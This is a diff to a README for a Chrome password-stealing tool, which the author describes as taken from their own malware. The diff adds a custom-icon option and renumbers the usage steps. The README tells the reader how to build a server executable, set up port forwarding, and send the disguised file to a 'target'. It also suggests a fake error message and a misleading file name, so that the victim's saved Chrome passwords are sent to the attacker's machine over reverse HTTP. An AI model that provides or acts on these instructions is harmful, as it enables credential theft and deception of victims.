@@ -27,6 +27,7 @@ Enviroment Variables: Do not forget to include Python27 folder and Scripts folde
 	2. Sends these passwords to the attacker, saving it on a text file, 
 	via HTTP (Passwords are saved in the same directory as the Client launched by the attacker)
 	3. Option of having a fake Error Message appear
+	4. Custom Icon
 
 Victim will open the server and all the Google Chrome Passwords will be sent to the attacker remotely and saved as a text file on the attacker's computer. The connection is done by reverse-http.
 
@@ -41,36 +42,40 @@ PS: This was originally part of one of my malwares so I had to adjust. I didn't 
 
 	1. If you want to activate the fake Error message, you should first uncomment line 147 (remove the # character). If you don't want a fake message to appear, skip this step.
 	
-	2. Create server by runing the python script "create_server.py"
+	2. If you want a custom icon place the icon on the same directory as the scripts and rename it "icon.ico', replacing the file that was already there with the same name. If you don't want a custom icon, skip this step.
+	
+	3. Create server by runing the python script "create_server.py"
 	It will then ask you for your ip, you must type your local ip (ex: 192.168.0.1)
 	To find this ip open up CMD and type "ipconfig"
 	
-	3. Start the client.exe 
+	4. Start the client.exe 
 	(I recommend having the client in a directory in "C:\", like "C:\ChromePass\client.exe")
 	
-	4. Send the server.exe to your target 
+	5. Send the server.exe to your target 
 	(choosing an appropriate name is always important)
 	
-	5. You will obtain a password text file in the same location as the client 
+	6. You will obtain a password text file in the same location as the client 
 	with all the Google Chrome Passwords.
 
 ## Remote Exploitation (If target is NOT on the same network as you):
 
 	1. If you want to activate the fake Error message, you should first uncomment line 147 (remove the # character). If you don't want a fake message to appear, skip this step.
 	
-	2. Create server by runing the python script "create_server.py". 
+	2. If you want a custom icon place the icon on the same directory as the scripts and rename it "icon.ico', replacing the file that was already there with the same name. If you don't want a custom icon, skip this step.	
+	
+	3. Create server by runing the python script "create_server.py". 
 	It will then ask you for your ip, you must type your PUBLIC ip (ex: 152.162.93.12). 
 	You can obtain your public ip by typing "WhatIsMyIp" on Google.
 	
-	3. Setup Port forwading. You want to forward the port 80 to your machine 
+	4. Setup Port forwading. You want to forward the port 80 to your machine 
 	(look up how to do that if you don't know)
 	
-	4. Start the client.exe
+	5. Start the client.exe
 	
-	5 Send the server.exe to your target 
+	6. Send the server.exe to your target 
 	(choosing an appopriate name is always important)
 	
-	6. You will obtain a password text file in the same location as the client 
+	7. You will obtain a password text file in the same location as the client 
 	with all the Google Chrome Passwords.
 
 
